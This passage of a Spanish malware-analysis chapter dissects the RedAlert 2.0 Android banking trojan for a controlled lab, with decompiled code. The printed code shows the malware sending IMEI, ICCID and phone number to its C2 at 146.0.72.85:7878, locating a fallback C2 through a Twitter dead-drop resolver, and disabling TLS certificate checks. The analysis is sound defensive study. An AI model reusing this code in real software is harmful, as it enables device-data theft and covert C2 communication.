@@ -1,0 +1,1461 @@
+```{=latex}
+\clearpage
+```
+
+### S0539 -- RedAlert 2.0
+
+[Red Alert 2.0, identificado por MITRE ATT&CK como S0539](https://attack.mitre.org/software/S0539/), es un troyano bancario para Android que puede presentarse como una aplicación legítima, comunicarse con su infraestructura de mando y control (C2) mediante HTTP y superponer plantillas maliciosas sobre otras aplicaciones. La familia y su infraestructura fueron documentadas por ThreatFabric en su [análisis de Red Alert 2.0](https://www.threatfabric.com/blogs/new_android_trojan_targeting_over_60_banks_and_social_apps). MITRE atribuye expresamente a Red Alert 2.0 el uso de Twitter para localizar un C2 de respaldo, el empleo de HTTP en el puerto 7878 y la descarga de plantillas adicionales. Estas capacidades corresponden, respectivamente, a [T1481.001, Web Service: Dead Drop Resolver](https://attack.mitre.org/techniques/T1481/001/), [T1509, Non-Standard Port](https://attack.mitre.org/techniques/T1509/) y [T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/).
+
+En este análisis, una plantilla es un documento HTML preparado para imitar la interfaz de una aplicación legítima, normalmente la pantalla de acceso o un formulario de una entidad bancaria. Cuando la aplicación objetivo se encuentra en primer plano, el malware puede mostrar ese HTML en un `WebView` superpuesto. El usuario ve una interfaz que aparenta pertenecer a la entidad, pero los datos introducidos quedan bajo el control del malware. La plantilla principal contiene la imitación que se presenta inicialmente; la muestra también admite una segunda variante, que el código denomina de «trabajo técnico» y puede mostrarse después.
+
+El catálogo de plantillas no contiene necesariamente esos documentos HTML. Es la respuesta con la que el C2 indica qué plantillas ofrece para las aplicaciones comunicadas por el dispositivo y proporciona los selectores necesarios para pedirlas. Después, la APK utiliza cada selector para descargar mediante otra solicitud el HTML de la plantilla correspondiente.
+
+La APK utiliza una única dirección base para comunicarse con el C2 y añade a ella distintas rutas según la operación que necesite realizar. Una vez registrado el dispositivo, el planificador pone en marcha dos flujos HTTP independientes. El primero consulta las órdenes remotas mediante `POST /sy`. El segundo gestiona las plantillas: comunica las aplicaciones instaladas y solicita el catálogo descrito anteriormente mediante `POST /sban`; a partir de los selectores incluidos en la respuesta, descarga los documentos HTML mediante `POST /gt`. La respuesta de `/sy` no inicia la descarga de plantillas; esta comienza por su propia tarea programada. Ambos flujos se ejecutan en hilos distintos y pueden coincidir en el tiempo, aunque dentro del flujo de plantillas existe un orden necesario: primero `/sban` y después uno o varios `/gt`. Por tanto, no se trata de dos canales de comunicación, sino de operaciones independientes realizadas contra el mismo C2 mediante rutas diferentes.
+
+El flujo seleccionado para el laboratorio reúne las tres técnicas indicadas sin modificar la lógica ni el comportamiento de red de la muestra. Primero, el cliente intenta abrir una conexión con la dirección primaria por el puerto no estándar 7878. La ausencia de respuesta impide completar la conexión y provoca la excepción que activa el mecanismo de resolución de respaldo antes de que pueda transmitirse la solicitud HTTP de registro. La aplicación consulta entonces un servicio de hora, calcula con su respuesta un identificador de Twitter, extrae de un tuit los fragmentos de otra dirección IPv4 y valida el C2 reconstruido mediante HTTP en el puerto 8060. Una ejecución posterior del planificador registra el dispositivo contra ese nuevo destino. Cuando el dispositivo ya figura como registrado, se reproduce el flujo de plantillas descrito anteriormente: `/sban`, uno o varios `/gt`, almacenamiento local de los documentos HTML y carga de estos en un `WebView` con JavaScript habilitado. La consulta de órdenes mediante `/sy` puede ejecutarse en paralelo, pero no forma parte de la cadena de descarga de las plantillas. Como se detalla al final, la ejecución requiere una copia derivada de la APK en la que solo se corrige la ubicación de dos recursos de jsoup.
+
+El análisis estático se apoya en la APK original abierta en JADX, mientras que el laboratorio ejecuta la copia parcheada descrita en su apartado correspondiente:
+
+| Artefacto utilizado | Función | Identificación | SHA-256 |
+|---|---|---|---|
+| [`b83bd8c755cb7546ef28bac157e51f04257686a045bbf9d64bec7eeb9116fd8a.apk`]{.content-visible unless-format="pdf"}[`\nolinkurl{b83bd8c755cb7546ef28bac157e51f04257686a045bbf9d64bec7eeb9116fd8a.apk}`{=latex}]{.content-visible when-format="pdf"} | APK original analizada en JADX | Paquete `com.kmc.prod`; versión 7.5; API mínima 13 y objetivo 22 | [`b83bd8c755cb7546ef28bac157e51f04257686a045bbf9d64bec7eeb9116fd8a`]{.content-visible unless-format="pdf"}[`\nolinkurl{b83bd8c755cb7546ef28bac157e51f04257686a045bbf9d64bec7eeb9116fd8a}`{=latex}]{.content-visible when-format="pdf"} |
+| [`RedAlert2.0-patched-entities.apk`]{.content-visible unless-format="pdf"}[`\nolinkurl{RedAlert2.0-patched-entities.apk}`{=latex}]{.content-visible when-format="pdf"} | APK derivada para el laboratorio | Duplica dos recursos de jsoup en la ruta esperada; no modifica `classes.dex` ni el comportamiento de red | [`25df7369d040f46649231e3e3edde759bfceab32e932ec6e9479bda41fc0949f`]{.content-visible unless-format="pdf"}[`\nolinkurl{25df7369d040f46649231e3e3edde759bfceab32e932ec6e9479bda41fc0949f}`{=latex}]{.content-visible when-format="pdf"} |
+
+#### Criterio de lectura del código ofuscado
+
+La ofuscación de esta muestra afecta principalmente a los nombres de paquetes, clases, métodos y atributos. Por ejemplo, la clase recuperada como `com.kmc.prod.d.a` contiene el comentario de compilación `DataRtmSender.java`, mientras que sus métodos de envío aparecen como `a(...)`, `b(...)`, `g()`, `h()`, `i()` y `j()`. Los fragmentos siguientes conservan los identificadores que muestra JADX y omiten mediante `// ...` únicamente las líneas que no intervienen en el resultado estudiado. La explicación que acompaña a cada fragmento deduce la función de esos identificadores a partir de su comportamiento; no los sustituye dentro del código por nombres semánticos que no pertenecen a la APK.
+
+Los recursos también presentan nombres ofuscados. Cuando un método obtiene, por ejemplo, `R.string.url_iscvdfi3`, el análisis muestra junto al fragmento su valor en `strings.xml`, `stbi`, antes de relacionarlo con la ruta `/stbi`. De este modo se mantiene separada la evidencia literal de la interpretación de red.
+
+#### Estructura del canal de red
+
+Los participantes necesarios son los siguientes:
+
+| Participante | Identidad de red | Función |
+| --- | --- | --- |
+| Dispositivo Android | Dirección asignada al terminal | Ejecuta la APK original y mantiene el estado en una base de datos SQLite local. |
+| Resolución DNS | Configuración de red de Android | Resuelve los nombres `www.timeapi.org` y `twitter.com`. |
+| Dirección primaria no implementada | `146.0.72.85:7878` | Valor inicial incrustado en `strings.xml`. En el flujo seleccionado no existe un servidor que responda al intento de conexión. |
+| TimeAPI | `www.timeapi.org:80` | Devuelve un cuerpo HTML cuyo texto se usa para calcular el identificador de Twitter. |
+| Twitter | `twitter.com:443` | Sirve por HTTPS una página con un primer elemento de clase `tweet-text`. |
+| C2 alternativo | `192.168.56.20:8060` | Extremo privado controlado reconstruido desde el texto `192.168 56.20` entregado por Twitter. Recibe la validación, el registro y las solicitudes de plantillas, pero no se presenta como IOC histórico. |
+
+La dirección `146.0.72.85` está escrita literalmente en la APK, por lo que el primer intento no requiere resolución DNS. No se desplegará ningún C2 primario ni ningún componente que responda en el puerto 7878. El intento de conexión permanecerá sin respuesta hasta que la pila TCP de Android lo dé por fallido. En una captura realizada junto al dispositivo se observarán el primer segmento `SYN` y las retransmisiones que efectúe la plataforma, pero no `POST /stbi`, porque el saludo TCP no llega a completarse. Los nombres `www.timeapi.org` y `twitter.com` sí requieren resolución DNS. El C2 alternativo no la requiere, ya que la aplicación lo reconstruye como una dirección IPv4 literal.
+
+#### Flujo completo de ejecución
+
+El recorrido parte de una base de datos recién creada y de un dispositivo aún no registrado. El primer intento de conexión se dirige a la dirección primaria incrustada, fracasa antes de transmitir HTTP y activa el resolver. El registro efectivo solo se produce más adelante contra el C2 alternativo.
+
+#### Estado inicial y planificación
+
+La clase interna `com.kmc.prod.c.a`, compilada con el nombre `DBProcessor_hvjd4`, es el componente que administra la base de datos local. En una base recién creada genera `iDataBase.db` y tres tablas: `currentCommand`, que conserva el registro y las órdenes; `template`, que almacena las plantillas; y `smsList`, que mantiene mensajes pendientes. Si `currentCommand` está vacía, inserta una fila con:
+
+```text
+id = 1
+domain = http://146.0.72.85:7878
+isRegistered = NULL
+uid = NULL
+```
+
+El valor inicial procede directamente del recurso `domain`:
+
+```xml
+<string name="domain">http://146.0.72.85:7878</string>
+```
+
+La clase `com.kmc.prod.c.a` inserta ese recurso sin resolverlo ni transformarlo:
+
+```java
+private static String f34a =
+        "SELECT * FROM currentCommand tab WHERE tab.isRegistered = 1";
+
+// ...
+Cursor cursorRawQuery = sQLiteDatabase.rawQuery(b, c);
+if (cursorRawQuery.getCount() == 0) {
+    ContentValues contentValues = new ContentValues();
+    contentValues.put("id", (Integer) 1);
+    contentValues.put("domain",
+            e.getResources().getString(R.string.domain));
+    sQLiteDatabase.insert("currentCommand", "", contentValues);
+}
+```
+
+La concordancia con la red es directa: `domain` ya contiene una dirección IPv4 literal y el puerto 7878. Por eso el primer destino es `146.0.72.85:7878` y no se genera una consulta DNS para localizarlo. La consulta almacenada en `f34a` también demuestra que el cliente considera registrado el dispositivo únicamente cuando existe una fila con `isRegistered = 1`.
+
+El campo `domain` guarda la dirección base del C2; el campo `isRegistered` indica si el servidor ya ha aceptado el registro; y el campo `uid` queda reservado para el identificador de bot que devolverá dicho servidor. La consulta que determina el registro busca una fila cuyo campo `isRegistered` sea `1`. Por tanto, el valor nulo inicial equivale a “no registrado”. La tabla `template` también comienza vacía.
+
+Al abrir la actividad que Android muestra en el lanzador, la APK inicia el servicio interno `WldService_duc3`. Su método `onStart` llama a `SchedulerExecutor.a`, que pone en marcha el planificador periódico de la muestra. El intervalo concreto depende del nivel de API de Android:
+
+- En el nivel de API 22 o inferior, esta ruta programa la primera ejecución unos 3 segundos después y repeticiones cada 20 segundos.
+- En un nivel superior a 22, el receptor auxiliar `RepeatedHadler` encadena alarmas nominales de 10 segundos.
+- El inicio provocado por `BOOT_COMPLETED`, el aviso de Android de que el dispositivo ha terminado de arrancar, usa otra rama y, en el nivel 22 o inferior, fija 30 segundos. El escenario descrito parte del lanzamiento limpio de la aplicación, por lo que la referencia principal es la primera de estas planificaciones.
+
+Cada vez que se activa el método [`SchedulerExecutor.onReceive`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.onReceive}`{=latex}]{.content-visible when-format="pdf"}, el planificador consulta `isRegistered`. Mientras sea falso, crea un hilo que ejecuta `DataRtmSender.g()`. La clase `DataRtmSender` construye y envía las solicitudes de red, y su método `g()` implementa el registro. No existe una llamada recursiva que mantenga una misma solicitud en espera hasta conseguirlo: cada activación del planificador produce como máximo un intento.
+
+El nombre corto `d` corresponde aquí a una clase interna recuperada de `SchedulerExecutor.java`. El siguiente par de fragmentos muestra la transición completa desde el estado no registrado hasta `DataRtmSender.g()`:
+
+```java
+public void onReceive(Context context, Intent intent) {
+    if (!com.kmc.prod.c.a.a(context).e()) {
+        new d(this, context).start();
+        return;
+    }
+    // ... tareas reservadas al estado registrado
+}
+```
+
+```java
+final class d extends Thread {
+    private Context f49a;
+
+    @Override
+    public final void run() {
+        super.run();
+        com.kmc.prod.d.a.a(this.f49a).g();
+    }
+}
+```
+
+El método `com.kmc.prod.c.a.e()` ejecuta la consulta de `isRegistered` mostrada anteriormente. Mientras devuelve falso, cada vencimiento crea una instancia nueva del hilo `d`; el código no consulta si ya existe otra. Este hecho explica a nivel de red la posible aparición de varios intentos TCP hacia `146.0.72.85:7878`.
+
+El planificador tampoco conserva una marca que indique que ya existe un intento de registro en curso. Si un hilo continúa esperando el establecimiento de la conexión cuando llega el siguiente vencimiento, `isRegistered` sigue siendo falso y [`SchedulerExecutor.onReceive`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.onReceive}`{=latex}]{.content-visible when-format="pdf"} crea otro hilo. En consecuencia, dejar la dirección primaria sin respuesta puede producir varios intentos TCP simultáneos contra `146.0.72.85:7878`. Su número depende de cuánto tarde la pila TCP en declarar fallida cada conexión y de los vencimientos de 20 o 10 segundos que ocurran durante esa espera.
+
+#### Intento de registro hacia la dirección primaria
+
+El método `DataRtmSender.g()` construye un objeto JSON con los siguientes campos:
+
+| Campo | Procedencia |
+| --- | --- |
+| `number` | [`TelephonyManager.getLine1Number()`]{.content-visible unless-format="pdf"}[`\nolinkurl{TelephonyManager.getLine1Number()}`{=latex}]{.content-visible when-format="pdf"} si devuelve un valor no vacío; en caso contrario, `getSubscriberId()`. |
+| `iccid` | [`TelephonyManager.getSimSerialNumber()`]{.content-visible unless-format="pdf"}[`\nolinkurl{TelephonyManager.getSimSerialNumber()}`{=latex}]{.content-visible when-format="pdf"}. |
+| `model` | Modelo con la primera letra en mayúscula si ya comienza por el fabricante; de lo contrario, fabricante con la primera letra en mayúscula, un espacio y el modelo. |
+| `imei` | [`TelephonyManager.getDeviceId()`]{.content-visible unless-format="pdf"}[`\nolinkurl{TelephonyManager.getDeviceId()}`{=latex}]{.content-visible when-format="pdf"}. |
+| `os` | Literal `Android ` seguido de `Build.VERSION.RELEASE`. |
+| `control_number` | Literal `delete later`. |
+| `type` | Literal `stbi`, obtenido de `strings.xml`. |
+| `lang` | [`Locale.getDefault().getLanguage()`]{.content-visible unless-format="pdf"}[`\nolinkurl{Locale.getDefault().getLanguage()}`{=latex}]{.content-visible when-format="pdf"}. |
+| `hash` | Literal [`jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq`]{.content-visible unless-format="pdf"}[`\nolinkurl{jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq}`{=latex}]{.content-visible when-format="pdf"}, obtenido de `strings.xml`. |
+
+El recurso ofuscado `url_iscvdfi3` resuelve la ruta lógica empleada por el método:
+
+```xml
+<string name="url_iscvdfi3">stbi</string>
+```
+
+El método `g()` de `com.kmc.prod.d.a`, clase compilada como `DataRtmSender`, construye el objeto y entrega el valor `stbi` a la rutina general de envío:
+
+```java
+public final void g() {
+    // ...
+    String string = this.f35a.getResources()
+            .getString(R.string.url_iscvdfi3);
+    JSONObject jSONObject = new JSONObject();
+
+    // Obtención de subscriberId y strB
+    // ...
+
+    jSONObject.put("number", subscriberId);
+    Context context2 = this.f35a;
+    jSONObject.put("iccid", context2 != null
+            ? ((TelephonyManager) context2.getSystemService("phone"))
+                    .getSimSerialNumber()
+            : "");
+    jSONObject.put("model", strB);
+    jSONObject.put("imei", ae.c(this.f35a));
+    jSONObject.put("os", "Android " + Build.VERSION.RELEASE);
+    jSONObject.put("control_number", "delete later");
+    jSONObject.put("type", string);
+    jSONObject.put("lang", Locale.getDefault().getLanguage());
+    jSONObject.put("hash",
+            this.f35a.getResources().getString(R.string.hash));
+
+    a(string, jSONObject.toString(), new com.kmc.prod.b.h());
+}
+```
+
+En esa última llamada, `string` vale `stbi`, `jSONObject.toString()` es el JSON de registro y `com.kmc.prod.b.h` es el manejador compilado como `RegisterDeviceResponse`. La rutina receptora concatena `domain + "/" + string`; por eso este código produce la ruta `/stbi` tanto con la dirección inicial como con el C2 que pueda guardarse después.
+
+El cliente prepara el siguiente intercambio de registro. Se documenta porque define el método, la ruta, las cabeceras y el cuerpo implementados por la muestra, pero no aparecerá en el PCAP del flujo seleccionado: solo podría transmitirse si antes se completase la conexión TCP.
+
+```http
+POST /stbi HTTP/1.1
+Host: 146.0.72.85:7878
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: <longitud de BASE64_DEFAULT(JSON_REGISTRO)>
+
+<BASE64_DEFAULT(JSON_REGISTRO)>
+```
+
+Aunque la cabecera declara `application/json`, el cuerpo no contiene el JSON en claro. La rutina llama a `String.getBytes()` y después a `android.util.Base64.encodeToString(..., Base64.DEFAULT)`. En Android, `Base64.DEFAULT` conserva el relleno, divide la salida en líneas de hasta 76 caracteres, usa `LF` como terminador porque no se activa `Base64.CRLF` y añade también un `LF` al final de una salida no vacía. La [documentación de `android.util.Base64`](https://developer.android.com/reference/android/util/Base64) confirma que `DEFAULT` es el valor `0` y que solo `NO_WRAP` eliminaría los terminadores de línea. La longitud explícita se calcula sobre la cadena Base64, por lo que incluye esos `LF`. El contenido previo a Base64 usa el juego de caracteres predeterminado de Android; para los valores habituales equivale a UTF-8.
+
+La conexión configura un tiempo máximo de lectura de 30 segundos, desactiva la caché y habilita entrada y salida. No establece un tiempo máximo de conexión. Las cabeceras `Host`, un posible `User-Agent` y otras propiedades del transporte pueden ser añadidas por la implementación de `HttpURLConnection`; no son constantes establecidas por la muestra.
+
+El método sobrecargado `a(String, String, ResponseHandler)` de `com.kmc.prod.d.a` contiene la correspondencia entre los argumentos anteriores y la solicitud HTTP:
+
+```java
+String strEncodeToString =
+        Base64.encodeToString(str2.getBytes(), 0);
+
+HttpURLConnection httpURLConnection =
+        (HttpURLConnection) new URL(
+                com.kmc.prod.c.a.a(this.f35a).a()
+                + "/" + str).openConnection();
+
+httpURLConnection.setReadTimeout(30000);
+httpURLConnection.setUseCaches(false);
+httpURLConnection.setRequestMethod("POST");
+httpURLConnection.setRequestProperty(
+        "Accept",
+        "text/html,application/xhtml+xml,application/xml,"
+        + "application/json;q=0.9,*/*;q=0.8");
+httpURLConnection.setRequestProperty(
+        "Accept-Language", "en-US,en;q=0.5");
+httpURLConnection.setRequestProperty(
+        "Connection", "keep-alive");
+httpURLConnection.setRequestProperty(
+        "Content-Type", "application/json");
+httpURLConnection.setRequestProperty(
+        "Content-Length",
+        Integer.toString(strEncodeToString.length()));
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setDoInput(true);
+
+DataOutputStream dataOutputStream =
+        new DataOutputStream(httpURLConnection.getOutputStream());
+dataOutputStream.writeBytes(strEncodeToString);
+// ...
+
+int responseCode = httpURLConnection.getResponseCode();
+BufferedReader bufferedReader = new BufferedReader(
+        new InputStreamReader(httpURLConnection.getInputStream()));
+// ... lectura de todas las líneas en sb
+
+if (responseCode != 200) {
+    throw new Exception("server response in NOT OK!");
+}
+iVar.a(sb.toString(), this.f35a);
+```
+
+En el registro, `str` es `stbi`, `str2` es el JSON y el método [`com.kmc.prod.c.a.a(context).a()`]{.content-visible unless-format="pdf"}[`\nolinkurl{com.kmc.prod.c.a.a(context).a()}`{=latex}]{.content-visible when-format="pdf"} devuelve el campo `domain`. El código demuestra conjuntamente el `POST`, la construcción de `/stbi`, la aplicación de `Base64.DEFAULT` mediante el indicador `0`, las cabeceras explícitas, la lectura del cuerpo y la exigencia del código `200`.
+
+El cliente obtiene el código de respuesta, abre el flujo de entrada, lee el cuerpo línea por línea y concatena las líneas sin reinsertar sus separadores. Solo después comprueba que el código sea exactamente `200`. Si lo es, entrega el cuerpo concatenado a `RegisterDeviceResponse`, el manejador encargado de procesar la contestación al registro. Este manejador no exige la palabra `OK`, JSON ni ningún otro formato: usa el cuerpo completo como `uid` o `bot_id`, dos nombres empleados por la muestra para el identificador que el C2 asigna al dispositivo, marca `isRegistered = 1` y pone en marcha las tareas posteriores.
+
+La apertura de la conexión, el envío, la lectura de la respuesta, la comprobación del código HTTP y la ejecución del manejador están dentro del mismo bloque `try`. Cualquier fallo de red que produzca una excepción durante esas operaciones transfiere la ejecución al bloque `catch` correspondiente. Si Android continúa indicando que existe conectividad general, ese bloque llama al resolver de respaldo. La activación del resolver no exige, por tanto, recibir una respuesta HTTP ni completar el saludo TCP. El simple hecho de que no llegue a establecerse la conexión con `146.0.72.85:7878` basta para recorrer la rama que inicia el mecanismo asociado a T1481.001.
+
+La llamada al resolver aparece en el bloque de error del mismo método:
+
+```java
+} catch (Exception e) {
+    if (h.a(this.f35a).a()) {
+        i();
+        new StringBuilder("url:")
+                .append(com.kmc.prod.c.a.a(this.f35a).a())
+                .append(str);
+    }
+}
+```
+
+El método `h.a(context).a()` comprueba que Android siga indicando una red conectada. El método ofuscado `i()` es el resolver que consulta TimeAPI y Twitter. Como `getOutputStream()`, `getResponseCode()`, la lectura y el manejador están dentro del `try`, una excepción en cualquiera de esos puntos alcanza la misma llamada. En el escenario seleccionado la excepción se produce antes de obtener el flujo de salida, porque no se completa la conexión TCP; en consecuencia, se observan los intentos TCP al puerto 7878 y después el resolver, pero no un `POST /stbi` primario.
+
+Por diseño del laboratorio, no será necesario implementar un servidor C2 primario. El intento hacia `146.0.72.85:7878` se dejará sin respuesta hasta que la pila TCP del dispositivo produzca la excepción de conexión. Cuando finalmente se produzca la excepción, el bloque `catch` iniciará el resolver siempre que la comprobación de conectividad general siga siendo verdadera.
+
+Cada hilo de registro pendiente contiene su propio bloque `catch`. Por ello, varios intentos primarios que terminen con una excepción pueden iniciar el resolver de forma independiente. Todos vuelven a consultar TimeAPI y Twitter. El primer resolver que valide el C2 alternativo mediante `/ping` guarda el nuevo dominio. Los demás comparan la dirección reconstruida con el valor que exista en SQLite cuando procesen el tuit: si ya coincide, omiten `/ping`; si dos resoluciones alcanzan esa comparación antes de que ninguno haya persistido el dominio, también pueden solaparse varias validaciones `/ping`. El código no impone exclusión mutua sobre esta secuencia.
+
+#### Ejecución completa del Dead Drop Resolver
+
+#### Consulta a TimeAPI
+
+El resolver construye primero la URL almacenada en `url_dsc7f3c83xfs`:
+
+```text
+http://www.timeapi.org/utc/now?%5CD
+```
+
+El dispositivo resuelve `www.timeapi.org` mediante la configuración DNS de Android. La pila puede consultar registros A, AAAA o ambos según la configuración del terminal; el código solo expresa el nombre y no selecciona el resolvedor ni fuerza un tipo de registro.
+
+La conexión se realiza mediante HTTP en el puerto 80:
+
+```http
+GET /utc/now?%5CD HTTP/1.1
+Host: www.timeapi.org
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+```
+
+El método ofuscado `j()` contiene tanto esta solicitud como el uso de su respuesta. El recurso que entrega a `URL` es:
+
+```xml
+<string name="url_dsc7f3c83xfs">http://www.timeapi.org/utc/now?%5CD</string>
+```
+
+El código relevante es:
+
+```java
+private String j() throws Exception {
+    HttpURLConnection httpURLConnection =
+            (HttpURLConnection) new URL(
+                    this.f35a.getResources()
+                            .getString(R.string.url_dsc7f3c83xfs))
+                    .openConnection();
+
+    httpURLConnection.setRequestMethod("GET");
+    httpURLConnection.setUseCaches(false);
+    httpURLConnection.setRequestProperty(
+            "Accept",
+            "text/html,application/xhtml+xml,application/xml,"
+            + "application/json;q=0.9,*/*;q=0.8");
+    httpURLConnection.setRequestProperty(
+            "Accept-Language", "en-US,en;q=0.5");
+
+    int responseCode = httpURLConnection.getResponseCode();
+    if (responseCode != 200) {
+        throw new Exception("twitter response in NOT OK!");
+    }
+
+    // ... lectura de la respuesta en sb
+
+    a.a.b.f fVarE = ae.e(sb.toString());
+    ae.f("body");
+    String strTrim = a.a.d.a.a(
+            new a.a.d.e("body".toLowerCase().trim()), fVarE)
+            .get(0).k().trim();
+
+    return !strTrim.isEmpty()
+            ? ae.a(strTrim
+                    + this.f35a.getResources().getString(R.string.hash))
+                    .substring(0, 15)
+            : "";
+}
+```
+
+Aunque el mensaje de la excepción menciona por error a Twitter, la URL literal demuestra que este método se comunica con `www.timeapi.org`. La ausencia de `setDoOutput(true)` y la selección explícita de `GET` concuerdan con una solicitud sin cuerpo. El valor retornado ya es el identificador de quince caracteres que consumirá el método de Twitter.
+
+La consulta debe conservarse literalmente como `%5CD`. El código desactiva la caché, no añade cuerpo y exige un código `200`. Después concatena las líneas de la respuesta, analiza el resultado como HTML, selecciona el primer elemento `body`, obtiene todo su texto descendiente con normalización de espacios y aplica `trim()`. El analizador acepta, por ejemplo, esta estructura mínima:
+
+```html
+<html><body><TEXTO_TIMEAPI></body></html>
+```
+
+El valor `<TEXTO_TIMEAPI>` no puede estar vacío y no está fijado dentro de la muestra. Su contenido condiciona el identificador de Twitter. Como varios hilos pueden ejecutar el resolver, respuestas distintas producirían identificadores distintos; una respuesta constante hace que todos reconstruyan el mismo resultado. Después de exponer el cálculo general, el documento fija el cuerpo concreto que utilizará el laboratorio y deriva de él la ruta exacta de Twitter.
+
+#### Cálculo del identificador de Twitter
+
+El recurso `hash` contiene:
+
+```text
+jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq
+```
+
+La entrada del cálculo es la concatenación directa, sin separador, de:
+
+```text
+TEXTO_NORMALIZADO_DEL_BODY + jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq
+```
+
+La función `ae.a(String)` calcula MD5 y representa sus 16 bytes mediante 32 caracteres hexadecimales en minúsculas, con dos caracteres por byte. A continuación, `substring(0, 15)` selecciona los caracteres comprendidos entre el índice 0, incluido, y el índice 15, excluido. El resultado contiene exactamente quince caracteres:
+
+```text
+TWITTER_ID = hex_minúscula(MD5(TEXTO_TIMEAPI_NORMALIZADO + HASH_RECURSO))[0:15]
+```
+
+La función `ae.a(String)`, recuperada dentro de la clase compilada como `Parser.java`, confirma la transformación:
+
+```java
+public static String a(String str) {
+    try {
+        MessageDigest messageDigest =
+                MessageDigest.getInstance("MD5");
+        messageDigest.update(str.getBytes());
+        byte[] bArrDigest = messageDigest.digest();
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bArrDigest) {
+            String hexString = Integer.toHexString(b & 255);
+            while (hexString.length() < 2) {
+                hexString = "0" + hexString;
+            }
+            sb.append(hexString);
+        }
+        return sb.toString();
+    } catch (NoSuchAlgorithmException e) {
+        e.printStackTrace();
+        return "";
+    }
+}
+```
+
+`Integer.toHexString` produce letras minúsculas y el bucle antepone un cero cuando un byte solo ocuparía un carácter hexadecimal. La llamada a `substring(0, 15)` pertenece al método `j()` mostrado anteriormente.
+
+El identificador solicitado a Twitter no puede determinarse sin conocer primero `<TEXTO_TIMEAPI>`. Debe ser siempre el resultado de la transformación anterior y no un nombre elegido de forma independiente.
+
+#### Relación seleccionada entre TimeAPI y Twitter
+
+La relación tiene dos etapas. El texto de TimeAPI determina la ruta que la APK solicita a Twitter, pero no contiene ni deriva la dirección del C2. La dirección aparece después, dentro del texto `tweet-text` servido por Twitter. Para el laboratorio se fija la siguiente cadena completa.
+
+El servicio de TimeAPI devolverá siempre el cuerpo UTF-8 siguiente, de 51 bytes:
+
+```html
+<html><body>2024-01-02T03:04:05+00:00</body></html>
+```
+
+La fecha es un valor sintético y constante elegido para el laboratorio; no se presenta como una fecha observada en la campaña. El analizador HTML de la APK obtiene exactamente:
+
+```text
+2024-01-02T03:04:05+00:00
+```
+
+La entrada de MD5, sin separador entre el texto anterior y el recurso `hash`, es:
+
+```text
+2024-01-02T03:04:05+00:00jfkbl6fm02mfk0rcuva0i4vgoxyej2z8tvlr01jq
+```
+
+Al codificar esa cadena ASCII como UTF-8 se obtienen 65 bytes. El resultado MD5 completo es:
+
+```text
+86d08d31c9d47332a26dbb0d22001186
+```
+
+La operación `substring(0, 15)` selecciona:
+
+```text
+86d08d31c9d4733
+```
+
+Por tanto, después de procesar la respuesta de TimeAPI, la APK solicitará exactamente:
+
+```text
+https://twitter.com/86d08d31c9d4733
+```
+
+La respuesta HTTP 200 asociada a esa ruta contendrá este documento UTF-8 de 63 bytes:
+
+```html
+<html><body><p class="tweet-text">192.168 56.20</p></body></html>
+```
+
+El primer elemento `tweet-text` proporciona `192.168 56.20`. El código separa la cadena por el espacio, une las dos mitades con un punto y añade el esquema y el puerto:
+
+```text
+192.168 56.20
+http://192.168.56.20
+http://192.168.56.20:8060
+```
+
+El laboratorio devuelve `192.168.56.20`, la dirección privada seleccionada en el escenario original, y añade el puerto 8060 previsto por el código. Este valor obliga a recorrer el mecanismo de respaldo sin atribuir a la campaña una segunda dirección pública no respaldada. El cuerpo de TimeAPI y el identificador `86d08d31c9d4733` se mantienen porque su cálculo no depende de la IPv4 publicada por Twitter.
+
+#### Consulta a Twitter
+
+La APK concatena `https://twitter.com/` y el identificador calculado. El dispositivo resuelve `twitter.com` mediante la configuración DNS de Android, establece una conexión TCP con el puerto 443 y negocia TLS con la dirección obtenida.
+
+Antes de abrir la conexión, la muestra modifica los valores predeterminados de `HttpsURLConnection`:
+
+- Instala un `HostnameVerifier` que devuelve siempre `true`. Por ello no rechaza un certificado cuyo nombre no corresponda a `twitter.com`.
+- Instala un `X509TrustManager` cuyas comprobaciones de certificados de cliente y servidor están vacías y cuya lista de emisores aceptados está vacía. Por ello no exige una cadena firmada por una autoridad de confianza.
+
+Las clases ofuscadas `com.kmc.prod.d.f` y `com.kmc.prod.d.g`, ambas recuperadas como componentes de `DataRtmSender.java`, implementan esas dos decisiones:
+
+```java
+final class f implements HostnameVerifier {
+    @Override
+    public final boolean verify(String str, SSLSession sSLSession) {
+        return true;
+    }
+}
+```
+
+```java
+final class g implements X509TrustManager {
+    @Override
+    public final void checkClientTrusted(
+            X509Certificate[] x509CertificateArr, String str) {
+    }
+
+    @Override
+    public final void checkServerTrusted(
+            X509Certificate[] x509CertificateArr, String str) {
+    }
+
+    @Override
+    public final X509Certificate[] getAcceptedIssuers() {
+        return new X509Certificate[0];
+    }
+}
+```
+
+Estas relajaciones no eliminan TLS. La negociación debe completarse, pero el cliente acepta un certificado autofirmado o emitido para otro nombre. La solicitud es:
+
+```http
+GET /86d08d31c9d4733 HTTP/1.1
+Host: twitter.com
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+```
+
+El recurso `idc83hxsc` contiene la dirección base de Twitter:
+
+```xml
+<string name="idc83hxsc">https://twitter.com/</string>
+```
+
+El método `i()` concatena esa base con el resultado de `j()`, instala los verificadores anteriores y abre la conexión HTTPS:
+
+```java
+private String i() throws Exception {
+    URL url = new URL(
+            this.f35a.getResources().getString(R.string.idc83hxsc)
+            + j());
+    try {
+        HttpsURLConnection.setDefaultHostnameVerifier(new f(this));
+        SSLContext sSLContext = SSLContext.getInstance("TLS");
+        sSLContext.init(
+                null,
+                new X509TrustManager[]{new g(this)},
+                new SecureRandom());
+        HttpsURLConnection.setDefaultSSLSocketFactory(
+                sSLContext.getSocketFactory());
